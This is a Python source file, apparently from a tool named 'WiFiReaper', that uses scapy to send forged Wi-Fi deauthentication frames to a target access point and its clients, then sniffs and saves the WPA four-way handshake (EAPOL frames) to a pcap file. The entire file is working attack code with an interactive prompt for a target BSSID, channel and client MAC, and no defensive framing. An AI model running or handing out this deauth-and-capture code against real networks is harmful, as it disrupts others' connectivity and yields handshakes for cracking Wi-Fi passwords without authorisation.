from scapy.all import *
import os
from datetime import datetime

eapol_captured = []
target_ssid = ""

def set_channel(interface, channel):
    os.system(f"iw dev {interface} set channel {channel}")

def deauth_attack(iface, bssid, client=None, count=3):
    print(f"[+] Sending {count} deauth packets on {iface}")
    pkt_list = []

    for _ in range(count):
        if client:
            pkt1 = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth(reason=7)
            pkt_list.extend([pkt1, pkt2])
        else:
            broadcast = "ff:ff:ff:ff:ff:ff"
            pkt = RadioTap()/Dot11(addr1=broadcast, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            pkt_list.append(pkt)

    sendp(pkt_list, iface=iface, verbose=0)
    print("[✔] Deauth packets sent.\n")

def handshake_sniffer(pkt):
    global eapol_captured, target_ssid
    if pkt.haslayer(EAPOL):
        print(f"[+] EAPOL Packet from {pkt.addr2} → {pkt.addr1}")
        eapol_captured.append(pkt)

        if pkt.haslayer(Dot11Elt) and not target_ssid:
            ssid_layer = pkt.getlayer(Dot11Elt)
            if ssid_layer and ssid_layer.ID == 0:
                target_ssid = ssid_layer.info.decode(errors="ignore")

        if len(eapol_captured) >= 4:
            raise KeyboardInterrupt

def capture_handshake(bssid, channel, iface, client=None):
    global eapol_captured, target_ssid
    eapol_captured = []
    target_ssid = ""

    set_channel(iface, channel)
    deauth_attack(iface, bssid, client, count=3)

    print(f"[+] Listening for handshake on {iface}... Press Ctrl+C to stop if needed.\n")

    try:
        sniff(iface=iface, prn=handshake_sniffer, store=0)
    except KeyboardInterrupt:
        if not eapol_captured:
            print("\n[-] No EAPOL packets captured.")
            return

        if not target_ssid:
            target_ssid = "unknownSSID"

        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        safe_ssid = "".join(c if c.isalnum() else "_" for c in target_ssid)
        filename = f"handshake_{safe_ssid}_{timestamp}.pcap"
        wrpcap(filename, eapol_captured)
        print(f"\n[✔] Handshake saved to: {filename}")

# Optional standalone use
if __name__ == "__main__":
    print("== WiFiReaper Handshake Capture ==")
    iface = input("Enter monitor mode interface (e.g., wlan0mon): ").strip()
    bssid = input("Enter target BSSID (AP MAC): ").strip()
    channel = input("Enter target channel: ").strip()
    client = input("Enter target client MAC (leave blank to broadcast): ").strip()
    client = client if client else None
    capture_handshake(bssid, channel, iface, client)
